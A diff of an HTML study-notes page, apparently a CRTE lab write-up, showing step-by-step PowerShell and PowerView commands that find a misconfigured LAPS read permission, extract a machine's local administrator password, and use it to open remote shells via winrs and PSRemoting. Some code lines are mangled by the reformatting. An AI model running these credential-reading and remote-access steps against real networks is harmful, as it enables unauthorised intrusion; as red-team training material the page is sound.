@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CRTE Part 6 - Privilege Escalation - LAPS (Local Administrator Password Solution) Attack | Mr Stark Study Notes</title>
+  <title>CRTE Part 6 - LAPS Attack | Mr Stark Study Notes</title>
   <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -96,6 +96,23 @@
       border-top: 1px solid var(--jet);
       margin: 40px 0;
     }
+    .goad-content table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 25px 0;
+      font-size: 18px;
+    }
+    .goad-content th, .goad-content td {
+      border: 1px solid var(--jet);
+      padding: 12px;
+      text-align: left;
+      color: var(--light-gray);
+    }
+    .goad-content th {
+      background: var(--eerie-black-2);
+      color: var(--white-2);
+      font-weight: 500;
+    }
     .part-navigation {
       display: flex;
       justify-content: space-between;
@@ -173,45 +190,12 @@
 <li><a href="part-02-enumeration.html">Part 2: Enumeration</a></li>
 <li><a href="part-03-privilege-escalation.html">Part 3: Privilege Escalation</a></li>
 <li><a href="part-04-kerberoasting-attack.html">Part 4: Kerberoasting attack</a></li>
-<li><a href="part-05-privilege-escalation-targeted-kerberoasting.html">Part 5: Privilege Escalation - Targeted Ker...</a></li>
-<li><a href="part-06-privilege-escalation-laps-local-administrator-pass.html" style="color: var(--orange-yellow-crayola);">Part 6: Privilege Escalation - LAPS (Local ...</a></li>
+<li><a href="part-05-privilege-escalation---targete.html">Part 5: Privilege Escalation - Targeted Kerberoasting</a></li>
+<li><a href="part-06-privilege-escalation---laps-lo.html" style="color: var(--orange-yellow-crayola);">Part 6: Privilege Escalation - LAPS (Local Administrator Pass...</a></li>
 <li><a href="part-07-dumping-lsass-credentials.html">Part 7: Dumping LSASS Credentials</a></li>
-<li><a href="part-08-privilege-escalation-gmsa-attack.html">Part 8: Privilege Escalation - gMSA Attack</a></li>
+<li><a href="part-08-privilege-escalation---gmsa-at.html">Part 8: Privilege Escalation - gMSA Attack</a></li>
 <li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: LSASS Attack With MDE Bypass</a></li>
 <li><a href="part-10-pass-the-certificates-attack.html">Part 10: Pass The Certificates Attack</a></li>
-<li><a href="part-11-privilege-escalation-unconstrained-delegation.html">Part 11: Privilege Escalation - Unconstraine...</a></li>
-<li><a href="part-12-privilege-escalation-constrained-delegation.html">Part 12: Privilege Escalation - Constrained ...</a></li>
-<li><a href="part-13-privilege-escalation-rbcdresource-based-constraine.html">Part 13: Privilege Escalation - RBCD(Resourc...</a></li>
-<li><a href="part-14-domain-persistence-golden-ticket-attack.html">Part 14: Domain Persistence - Golden Ticket ...</a></li>
-<li><a href="part-15-domain-persistence-silver-ticket-attack.html">Part 15: Domain Persistence - Silver Ticket ...</a></li>
-<li><a href="part-16-domain-persistence-diamond-ticket-attack.html">Part 16: Domain Persistence - Diamond Ticket...</a></li>
-<li><a href="part-17-domain-persistence-skeleton-key-attack.html">Part 17: Domain Persistence - Skeleton Key A...</a></li>
-<li><a href="part-18-domain-persistence-sapphire-ticket-attack.html">Part 18: Domain Persistence - Sapphire Ticke...</a></li>
-<li><a href="part-19-domain-persistence-adminsdholder-attack.html">Part 19: Domain Persistence - AdminSDHolder ...</a></li>
-<li><a href="part-20-cross-domain-attacks-active-directory-certificate.html">Part 20: Cross Domain Attacks - Active Direc...</a></li>
-<li><a href="part-21-shadow-credentials-abusing-user-object.html">Part 21: Shadow Credentials - Abusing User O...</a></li>
-<li><a href="part-22-cross-domain-attacks-unconstrained-delegation-to-e.html">Part 22: Cross Domain Attacks - Unconstraine...</a></li>
-<li><a href="part-23-cross-domain-attacks-attacking-azure-ad-integratio.html">Part 23: Cross Domain Attacks - Attacking Az...</a></li>
-<li><a href="part-24-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 24: Cross Domain attacks - Child To For...</a></li>
-<li><a href="part-25-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 25: Cross Domain attacks - Child To For...</a></li>
-<li><a href="part-26-cross-forest-attacks-kerberoast-attack.html">Part 26: Cross Forest Attacks - Kerberoast A...</a></li>
-<li><a href="part-27-cross-forest-attacks-constrained-delegation-with-p.html">Part 27: Cross Forest Attacks - Constrained ...</a></li>
-<li><a href="part-28-cross-forest-attacks-unconstrained-delegation.html">Part 28: Cross Forest Attacks - Unconstraine...</a></li>
-<li><a href="part-29-cross-forest-attacks-trust-key-abuse-to-access-exp.html">Part 29: Cross Forest Attacks - Trust Key Ab...</a></li>
-<li><a href="part-30-cross-forest-attacks-injecting-sid-history-to-bypa.html">Part 30: Cross Forest Attacks - Injecting SI...</a></li>
-<li><a href="part-31-trust-abuse-mssql-servers-database-links.html">Part 31: Trust Abuse - MSSQL Servers - Datab...</a></li>
-<li><a href="part-32-cross-forest-attacks-foreign-security-principals-a.html">Part 32: Cross Forest Attacks - Foreign Secu...</a></li>
-<li><a href="part-33-cross-forest-attacks-abusing-pamprivileged-managem.html">Part 33: Cross Forest Attacks - Abusing PAM(...</a></li>
-<li><a href="part-34-cross-forest-attacks-trusting-to-trusted-trust-key.html">Part 34: Cross Forest Attacks - Trusting to ...</a></li>
-<li><a href="part-35-cross-forest-attacks-abusing-trust-transitivity.html">Part 35: Cross Forest Attacks - Abusing Trus...</a></li>
-        </ul>
-        <div class="separator"></div>
-        <ul class="social-list">
-          <li class="social-item">
-            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
-              <ion-icon name="logo-github"></ion-icon>
-            </a>
-          </li>
         </ul>
       </div>
     </aside>
@@ -219,254 +203,182 @@
       <article class="about active" data-page="about">
         <div class="goad-content">
 <h1>CRTE - Certified Red Team Expert</h1>
-
-<h2>Privilege Escalation - LAPS (Local Administrator Password Solution) Attack</h2>
-
-LAPS (Local Administrator Password Solution) is a Microsoft tool designed to enhance the security of local administrator accounts on Windows machines in an Active Directory (AD) environment. 
-It achieves this by:
+<h2><strong>Privilege Escalation - LAPS (Local Administrator Password Solution) Attack</strong></h2>
+<p>LAPS (Local Administrator Password Solution) is a <strong>Microsoft tool</strong> designed to enhance the security of local administrator accounts on Windows machines in an Active Directory (AD) environment.</p>
+<p>It achieves this by:</p>
 <ol>
-<li>Managing Local Admin Passwords Automatically: LAPS automatically generates a unique, complex password for the local administrator account on each machine.</li>
-<li>Storing Passwords Securely in AD: These passwords are securely stored in Active Directory and are tied to the computer object in AD.</li>
-<li>Controlling Access: Only authorized users or groups can retrieve the stored passwords using permissions configured in AD.</li>
+<li><strong>Managing Local Admin Passwords Automatically:</strong> LAPS automatically generates a <strong>unique, complex password</strong> for the local administrator account on each machine.</li>
+<li><strong>Storing Passwords Securely in AD:</strong> These passwords are securely stored in Active Directory and are tied to the computer object in AD.</li>
+<li><strong>Controlling Access:</strong> Only authorized users or groups can retrieve the stored passwords using permissions configured in AD.</li>
 </ol>
-LAPS was developed to address the problem of shared local admin passwords, which attackers could exploit to perform lateral movement across machines in a network.
-<h3>How Does LAPS Work?</h3>
-
+<p>LAPS was developed to address the problem of <strong>shared local admin passwords</strong>, which attackers could exploit to perform <strong>lateral movement</strong> across machines in a network.</p>
+<h3><strong>How Does LAPS Work?</strong></h3>
 <ol>
-<li>Password Generation: LAPS periodically generates a random, complex password for the local admin account of each computer.</li>
-<li>Password Storage: The password is stored as an attribute (ms-MCS-AdmPwd) in the computer object in AD.</li>
-<li>Access Control: Permissions in AD control who can read the password.</li>
-<li>Password Expiry: The password is rotated automatically based on the policy you configure.</li>
+<li><strong>Password Generation:</strong> LAPS periodically generates a random, complex password for the local admin account of each computer.</li>
+<li><strong>Password Storage:</strong> The password is stored as an attribute (<code>ms-MCS-AdmPwd</code>) in the computer object in AD.</li>
+<li><strong>Access Control:</strong> Permissions in AD control who can read the password.</li>
+<li><strong>Password Expiry:</strong> The password is rotated automatically based on the policy you configure.</li>
 </ol>
-<h3>Key Benefits of LAPS</h3>
-
+<h3><strong>Key Benefits of LAPS</strong></h3>
 <ul>
-<li>Prevents Lateral Movement: Each computer has a unique password, so an attacker can't use the same password to move between systems.</li>
-<li>Reduces Administrative Overhead: Admins don’t need to manually manage local admin passwords.</li>
-<li>Integrates with AD: Passwords are stored securely and can be accessed only by authorized users or groups.</li>
-<li>Supports Audit and Compliance: Helps organizations meet security requirements by ensuring local admin accounts are managed securely.</li>
+<li><strong>Prevents Lateral Movement:</strong> Each computer has a unique password, so an attacker can't use the same password to move between systems.</li>
+<li><strong>Reduces Administrative Overhead:</strong> Admins don’t need to manually manage local admin passwords.</li>
+<li><strong>Integrates with AD:</strong> Passwords are stored securely and can be accessed only by authorized users or groups.</li>
+<li><strong>Supports Audit and Compliance:</strong> Helps organizations meet security requirements by ensuring local admin accounts are managed securely.</li>
 </ul>
-<h3>Crucial Aspects to Understand</h3>
-
+<h3><strong>Crucial Aspects to Understand</strong></h3>
 <ol>
-<li>Unique Passwords Per Machine: Every managed computer gets its own unique local admin password.</li>
-<li>Stored in AD: Passwords are saved in the ms-MCS-AdmPwd attribute of the computer object in AD.</li>
-<li>Controlled Access: Only specific users or groups (e.g., Helpdesk or System Admins) are allowed to retrieve passwords.</li>
-<li>No Password Reuse: LAPS ensures that passwords are rotated and not reused across machines.</li>
-<li>AD Permissions Are Key: Attackers need permission to read the ms-MCS-AdmPwd attribute in AD to retrieve LAPS passwords.</li>
+<li><strong>Unique Passwords Per Machine:</strong> Every managed computer gets its own unique local admin password.</li>
+<li><strong>Stored in AD:</strong> Passwords are saved in the <code>ms-MCS-AdmPwd</code> attribute of the computer object in AD.</li>
+<li><strong>Controlled Access:</strong> Only specific users or groups (e.g., Helpdesk or System Admins) are allowed to retrieve passwords.</li>
+<li><strong>No Password Reuse:</strong> LAPS ensures that passwords are rotated and not reused across machines.</li>
+<li><strong>AD Permissions Are Key:</strong> Attackers need permission to read the <code>ms-MCS-AdmPwd</code> attribute in AD to retrieve LAPS passwords.</li>
+<li><code>LAPS runs on the clients to manage and rotate the local administrator passwords.</code></li>
+<li><code>The DC stores the managed passwords in AD for retrieval by authorized users.</code></li>
 </ol>
+<h3><strong>LAPS Attack User Scenario</strong></h3>
+<p><strong>Objective:</strong> Compromise a Windows machine using LAPS misconfigurations.</p>
+<h3><strong>Scenario Overview</strong></h3>
+<ol>
+<li><strong>Setup:</strong> An organization deploys LAPS across all machines, but permissions to access stored passwords (<code>ms-MCS-AdmPwd</code>) are misconfigured.</li>
+<li><strong>Attack Vector:</strong></li>
 <ul>
-<li>LAPS runs on the clients to manage and rotate the local administrator passwords.</li>
-<li>The DC stores the managed passwords in AD for retrieval by authorized users.</li>
+<li>An attacker compromises a low-privileged user account in the domain.</li>
+<li>The attacker checks AD permissions and discovers that the low-privileged account can read the <code>ms-MCS-AdmPwd</code> attribute.</li>
+<li><strong>Execution:</strong></li>
+<li>The attacker queries the LAPS attribute for a specific machine and retrieves the stored local admin password.</li>
+<li>With the local admin password, the attacker gains local administrator privileges on the target machine.</li>
+<li><strong>Impact:</strong></li>
+<li>The attacker may use local admin rights to escalate privileges, install backdoors, or exfiltrate data.</li>
+<li>If other systems are misconfigured, lateral movement could follow.</li>
 </ul>
-<h3>LAPS Attack User Scenario</h3>
-
-Objective: Compromise a Windows machine using LAPS misconfigurations.
-<h3>Scenario Overview</h3>
-
-<ol>
-<li>Setup: An organization deploys LAPS across all machines, but permissions to access stored passwords (ms-MCS-AdmPwd) are misconfigured.</li>
-<li>Attack Vector:</li>
-<li>Execution:</li>
-<li>Impact:</li>
 </ol>
-
 <h2>LAPS Diagram</h2>
-
-<img src="./images/screenshot_72.png" alt="">
-
-
-
-<h1>LAPS (Local Administrator Password Solution) Attack with ADModule and LAPS Module</h1>
-
+<img src="./images/screenshot_70.png" alt="image">
+<h1><strong>LAPS (Local Administrator Password Solution) Attack with ADModule and LAPS Module</strong></h1>
 <h3>Enumerating LAPS with ADModule and LAPS Module</h3>
-
-<p>We will enumerate the LAPS configured on the Domain with ADModule
-Let’s start by importing ADModule
-Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
-Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</p>
-
-Importing LAPS Module
-this module can be downloaded here and follow the manual installation here.
-Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
-<img src="./images/screenshot_73.png" alt="">
-
-Now that we have imported the 2 modules, Let’s enumerate the Organizational Unit where LAPS is configured.
-For that we will use the script Get-LapsPermissions.ps1. 
-C:\AD\Tools\Get-LapsPermissions.ps1 -Verbose
-<img src="./images/screenshot_74.png" alt="">
-
-The output of the Get-LapsPermissions.ps1 script provides details about the read and write permissions for LAPS-related attributes in Active Directory.
+<p>We will enumerate the LAPS configured on the Domain with ADModule</p>
+<p>Let’s start by importing ADModule</p>
+<p><code>Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dllImport-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</code></p>
+<p>Importing LAPS Module</p>
+<p>this module can be downloaded here and follow the manual installation here.</p>
+<p><code>Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose</code></p>
+<img src="./images/screenshot_71.png" alt="image">
+<p>Now that we have imported the 2 modules, Let’s enumerate the Organizational Unit where LAPS is configured.</p>
+<p>For that we will use the script <code>Get-LapsPermissions.ps1</code>.</p>
+<p><code>C:\AD\Tools\Get-LapsPermissions.ps1 -Verbose</code></p>
+<img src="./images/screenshot_72.png" alt="image">
+<p>The output of the <code>Get-LapsPermissions.ps1</code> script provides details about the <strong>read</strong> and <strong>write</strong> permissions for LAPS-related attributes in Active Directory.</p>
 <ol>
-<li>Read Rights:</li>
-<li>Write Rights:</li>
-</ol>
-<h3>Interpretation:</h3>
-
+<li><strong>Read Rights:</strong></li>
 <ul>
-<li>Read Rights: The US\studentusers group has permission to retrieve the local admin passwords for machines in the MailMgmt OU.</li>
-<li>Write Rights: Each computer in the MailMgmt OU is configured to write its local admin password to its corresponding AD attribute.</li>
+<li><strong>OrganizationalUnit</strong>: This indicates the Organizational Unit (OU) in Active Directory where the permission is applied. </li>
 </ul>
-
-<h1>Enumerating Computers on Organization Unit With ADModule</h1>
-
-We can use the command Get-ADOrganizationaUnit and get all the OUs inside our domain and then we can filter it by the OU we want and request for the computer names inside of it.
-Get-ADOrganizationaUnit
- Get-ADOrganizationalUnit -Identity 'OU=MailMgmt,DC=us,DC=techcorp,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name
-<img src="./images/screenshot_75.png" alt="">
-
-<p>We can see above that we do have one computer names US-MAILMGMT inside MailMgmt OU and since we do have permission to read the LAPS passwords from computers inside MailMgmt OU, we can simply check the password for US-MAILMGMT.</p>
-
-<h2>Read LAPS Password With ADModule</h2>
-
-Since we already know that US\studentusers group has permission to retrieve the local admin passwords for machines in the MailMgmt OU, we can execute the following ADModule command to read the LAPS password from MailMgmt Organizational Unit.
-Get-ADComputer -Identity 'US-MAILMGMT' -Properties 'ms-mcs-admpwd' | Select -ExpandProperty 'ms-mcs-admpwd'
-<img src="./images/screenshot_76.png" alt="">
-
-We have were able to read the US-MAILMGMT computer admin credential. .1G9]@!BNT1Y5G
-<h2>Read LAPS Password With LAPS Module</h2>
-
-Get-AdmPwdPassword -ComputerName 'US-MAILMGMT'
-<img src="./images/screenshot_77.png" alt="">
-
-LAPS module was able to retrive the US-MAILMGMT computer inside MailMgmt OU.
-<h1>LAPS (Local Administrator Password Solution) Attack With PowerView</h1>
-
-We can attack LAPS with PowerView as well, and honestly I think that, PowerView is away better tool for this type of attack, because of its simplitcity.
-<h1>Enumerating LAPS with PowerView</h1>
-
-We can also enumerate LAPS configuration on a domain using PowerView.
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_}
-<img src="./images/screenshot_78.png" alt="">
-
-The US\studentusers group has ReadProperty permission on the ms-Mcs-AdmPwd attribute for computers in the MailMgmt OU, allowing them to access LAPS-managed passwords.
-<h3>1. IdentityName</h3>
-
+</ol>
+<p><code>OU=MailMgmt,DC=us,DC=techcorp,DC=local</code></p>
+<p>This is the Mail Management OU under the <code>us.techcorp.local</code> domain.</p>
 <ul>
-<li>Value: US\studentusers</li>
-<li>This is the principal (user or group) that can access the ms-Mcs-AdmPwd attribute of objects in the scope (e.g., OUs or computer objects).</li>
+<li><strong>IdentityReference</strong>: This is the security principal (user or group) that has been granted <strong>read access</strong> to the LAPS password stored in the <code>ms-Mcs-AdmPwd</code> attribute.</li>
+</ul>
+</ul>
+<p><code>US\studentusers</code></p>
+<p>This means the <code>studentusers</code> group in the <code>US</code> domain has the right to <strong>read</strong> the local administrator passwords for computers in this OU.</p>
+<ol>
+<li><strong>Write Rights:</strong></li>
+<ul>
+<li><strong>OrganizationalUnit</strong>: Again, this is the OU where the permission is applied, which is the same as the read rights (<code>OU=MailMgmt</code>).</li>
+<li><strong>IdentityReference</strong>: This indicates the security principal with <strong>write access</strong> to the LAPS attributes.</li>
+</ul>
+</ol>
+<p><code>NT AUTHORITY\SELF</code></p>
+<p>This means that the computer account (via the SELF security principal) can <strong>write its own password</strong> (e.g., update the <code>ms-Mcs-AdmPwd</code> attribute) to Active Directory.</p>
+<p>This is a standard LAPS configuration.</p>
+<h3>Interpretation:</h3>
+<ul>
+<li><strong>Read Rights</strong>: The <code>US\studentusers</code> group has permission to retrieve the local admin passwords for machines in the <code>MailMgmt</code> OU.</li>
+<li><strong>Write Rights</strong>: Each computer in the <code>MailMgmt</code> OU is configured to write its local admin password to its corresponding AD attribute.</li>
+</ul>
+<h1>Enumerating Computers on Organization Unit With ADModule</h1>
+<p>We can use the command <code>Get-ADOrganizationaUnit</code> and get all the OUs inside our domain and then we can filter it by the OU we want and request for the computer names inside of it.</p>
+<p><code>Get-ADOrganizationaUnit Get-ADOrganizationalUnit -Identity 'OU=MailMgmt,DC=us,DC=techcorp,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p>
+<img src="./images/screenshot_73.png" alt="image">
+<p>We can see above that we do have one computer names <code>US-MAILMGMT</code> inside <code>MailMgmt</code> OU and since we do have permission to read the LAPS passwords from computers inside <code>MailMgmt</code> OU, we can simply check the password for <code>US-MAILMGMT</code>.</p>
+<h2>Read LAPS Password With ADModule</h2>
+<p>Since we already know that <code>US\studentusers</code> group has permission to retrieve the local admin passwords for machines in the <code>MailMgmt</code> OU, we can execute the following ADModule command to read the LAPS password from <code>MailMgmt</code> Organizational Unit.</p>
+<p><code>Get-ADComputer -Identity 'US-MAILMGMT' -Properties 'ms-mcs-admpwd' | Select -ExpandProperty 'ms-mcs-admpwd'</code></p>
+<img src="./images/screenshot_74.png" alt="image">
+<p>We have were able to read the <code>US-MAILMGMT</code> computer admin credential. <code>.1G9]@!BNT1Y5G</code></p>
+<h2>Read LAPS Password With LAPS Module</h2>
+<p><code>Get-AdmPwdPassword -ComputerName 'US-MAILMGMT'</code></p>
+<img src="./images/screenshot_75.png" alt="image">
+<p>LAPS module was able to retrive the <code>US-MAILMGMT</code> computer inside <code>MailMgmt</code> OU.</p>
+<h1><strong>LAPS (Local Administrator Password Solution) Attack With PowerView</strong></h1>
+<p>We can attack LAPS with PowerView as well, and honestly I think that, PowerView is away better tool for this type of attack, because of its simplitcity.</p>
+<h1>Enumerating LAPS with PowerView</h1>
+<p>We can also enumerate LAPS configuration on a domain using PowerView.</p>
+<p><code>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($<em>.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($</em>.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$<em> | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $</em>.SecurityIdentifier); $_}</code></p>
+<img src="./images/screenshot_76.png" alt="image">
+<p>The <code>US\studentusers</code> group has <code>ReadProperty</code> permission on the <code>ms-Mcs-AdmPwd</code> attribute for computers in the <code>MailMgmt</code> OU, allowing them to access LAPS-managed passwords.</p>
+<h3><strong>1. IdentityName</strong></h3>
+<ul>
+<li><strong>Value</strong>: <code>US\studentusers</code></li>
+<li>This shows the <strong>user or group</strong> that has been granted permissions (in this case, the <code>US\studentusers</code> group).</li>
+<li>This field is resolved from the <code>SecurityIdentifier</code> (SID) of the ACL entry.</li>
+<li>This is the <strong>principal</strong> (user or group) that can access the <code>ms-Mcs-AdmPwd</code> attribute of objects in the scope (e.g., OUs or computer objects).</li>
 <li>You need to carefully verify whether this group is authorized to access sensitive data like LAPS-managed passwords.</li>
 </ul>
-<h3>2. ObjectDN</h3>
-
-<ul>
-<li>Value: OU=MailMgmt,DC=us,DC=techcorp,DC=local</li>
-<li>This indicates where in Active Directory the LAPS configuration or permissions are applied.</li>
-<li>All computer objects under this OU (OU=MailMgmt) may have their local admin passwords managed by LAPS.</li>
 </ul>
-<h3>3. ActiveDirectoryRights</h3>
-
+<h3><strong>2. ObjectDN</strong></h3>
 <ul>
-<li>Value: ReadProperty</li>
-<li>ReadProperty on ms-Mcs-AdmPwd allows users or groups to retrieve the local administrator password managed by LAPS.</li>
+<li><strong>Value</strong>: <code>OU=MailMgmt,DC=us,DC=techcorp,DC=local</code></li>
+<li>The <strong>Distinguished Name (DN)</strong> of the <strong>Organizational Unit (OU)</strong> to which this ACL applies.</li>
+<li>In this case, the ACL is applied to the <code>MailMgmt</code> OU in the domain <code>us.techcorp.local</code>.</li>
+<li>This indicates <strong>where</strong> in Active Directory the LAPS configuration or permissions are applied.</li>
+<li>All computer objects under this OU (<code>OU=MailMgmt</code>) may have their local admin passwords managed by LAPS.</li>
+</ul>
+</ul>
+<h3><strong>3. ActiveDirectoryRights</strong></h3>
+<ul>
+<li><strong>Value</strong>: <code>ReadProperty</code></li>
+<li>This shows the specific rights the <code>US\studentusers</code> group has for the <code>ms-Mcs-AdmPwd</code> attribute.</li>
+<li><code>ReadProperty</code> means this group can <strong>read the LAPS-managed password</strong> for computer objects in the <code>MailMgmt</code> OU.</li>
+<li><strong>ReadProperty</strong> on <code>ms-Mcs-AdmPwd</code> allows users or groups to retrieve the local administrator password managed by LAPS.</li>
 <li>This is highly sensitive, and access should typically be restricted to authorized administrators (e.g., IT Helpdesk or a secure group).</li>
 </ul>
-
+</ul>
 <h2>Enumerating Computers on Organization Unit With PowerView</h2>
-
-Since we are part of US/Studentusers group, we can read LAPS-Managed Passwords inside MailMgmt OU. Let’s enumerate what computers are inside MailMgmt OU to be able to read the local administrator password.
-We can start by enumerating all the OUs inside our domain to be able to get the DistinguishedName we need to be find out what computers are inside that OU.
-The Command Get-DomainOU will bring us all the configured OUs inside our domain, once we find the OU we are looking for we need to use it’s DistinguishedName.
-Get-DomainOU
-(Get-DomainOU -Identity 'OU=MailMgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Select name
-<img src="./images/screenshot_79.png" alt="">
-
+<p>Since we are part of <code>US/Studentusers</code> group, we can read LAPS-Managed Passwords inside <code>MailMgmt</code> OU. Let’s enumerate what computers are inside MailMgmt OU to be able to read the local administrator password.</p>
+<p>We can start by enumerating all the OUs inside our domain to be able to get the DistinguishedName we need to be find out what computers are inside that OU.</p>
+<p>The Command <code>Get-DomainOU</code> will bring us all the configured OUs inside our domain, once we find the OU we are looking for we need to use it’s <code>DistinguishedName</code>.</p>
+<p><code>Get-DomainOU(Get-DomainOU -Identity 'OU=MailMgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Select name</code></p>
+<img src="./images/screenshot_77.png" alt="image">
 <h2>Read LAPS Password With PowerView</h2>
-
-We can see above that, inside MailMgmt OU we do have only one computer, let’s read this computer Local Administrator’s password.
-Get-DomainObject -Identity 'US-MAILMGMT' | Select -ExpandProperty 'ms-mcs-admpwd'
-<img src="./images/screenshot_80.png" alt="">
-
-<p>Voila, we successfully attacked LAPS configured on this domain and got clear-text password for the computer inside MailMgmt Organizational Unit.</p>
-
+<p>We can see above that, inside <code>MailMgmt</code> OU we do have only one computer, let’s read this computer Local Administrator’s password.</p>
+<p><code>Get-DomainObject -Identity 'US-MAILMGMT' | Select -ExpandProperty 'ms-mcs-admpwd'</code></p>
+<img src="./images/screenshot_78.png" alt="image">
+<p>Voila, we successfully attacked LAPS configured on this domain and got clear-text password for the computer inside <code>MailMgmt</code> Organizational Unit.</p>
 <h1>Accessing US-MailMgtm computer with WinRS</h1>
-
-Now that we do have US-MailMgmt local administrator’s clear-text password, we can simply try to access the machine remotely using WinRS tool.
-winrs -r:US-MAILMGMT -u:'.\Administrator' -p:'.1G9]@!BNTlY5G' cmd
-<img src="./images/screenshot_81.png" alt="">
-
-<p>We successfully remotely accessed US-MailMgmt machine. Please bare in mind that we had to you the username as .\Administrator’s because we are using the local Administrator password and not the Domain Administrator password.</p>
-
+<p>Now that we do have <code>US-MailMgmt </code>local administrator’s clear-text password, we can simply try to access the machine remotely using WinRS tool.</p>
+<p><code>winrs -r:US-MAILMGMT -u:'.\Administrator' -p:'.1G9]@!BNTlY5G' cmd</code></p>
+<img src="./images/screenshot_79.png" alt="image">
+<p>We successfully remotely accessed US-MailMgmt machine. Please bare in mind that we had to you the username as <code>.\Administrator</code>’s because we are using the local Administrator password and not the Domain Administrator password.</p>
 <h1>Accessing US-MailMgtm computer with PSRemoting Session</h1>
-
-Now that we do have US-MailMgmt local administrator’s clear-text password, we can simply try to access the machine remotely using PSRemote Session
-$password = ConvertTo-SecureString '.1G9]@!BNTlY5G' -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential ('us-mailmgmt\administrator', $password)
-$mailmgmt = New-PSSession -ComputerName 'US-MailMgmt' -Credential $creds
-$mailmgmt
-<img src="./images/screenshot_82.png" alt="">
-
-We can now remote access mailmgmt with the following command.
-Enter-PSSession -Session $mailmgmt
-<img src="./images/screenshot_83.png" alt="">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="part-navigation">
-            <a href="part-05-privilege-escalation-targeted-kerberoasting.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Privilege Escalation - Targete</a>
-            <a href="part-07-dumping-lsass-credentials.html">Next: Dumping LSASS Credentials <ion-icon name="arrow-forward-outline"></ion-icon></a>
+<p>Now that we do have <code>US-MailMgmt </code>local administrator’s clear-text password, we can simply try to access the machine remotely using PSRemote Session</p>
+<p>`$password = ConvertTo-SecureString '.1G9]@!BNTlY5G' -AsPlainText -Force</p>
+<p>$creds = New-Object System.Management.Automation.PSCredential ('us-mailmgmt\administrator', $password)</p>
+<p>$mailmgmt = New-PSSession -ComputerName 'US-MailMgmt' -Credential $creds</p>
+<p>$mailmgmt<code> ![image](./images/screenshot_80.png) We can now remote access mailmgmt with the following command. </code>Enter-PSSession -Session $mailmgmt`</p>
+<img src="./images/screenshot_81.png" alt="image">
+          <div class="part-navigation">
+            <a href="part-05-privilege-escalation-targeted-kerberoasting.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Targeted Kerberoasting</a>
+            <a href="part-07-dumping-lsass-credentials.html">Next: Dumping LSASS <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
         </div>
       </article>
     </div>
   </main>
-  <script src="../assets/js/script.js"></script>
   <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
   <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script src="../assets/js/script.js"></script>
 </body>
 </html>
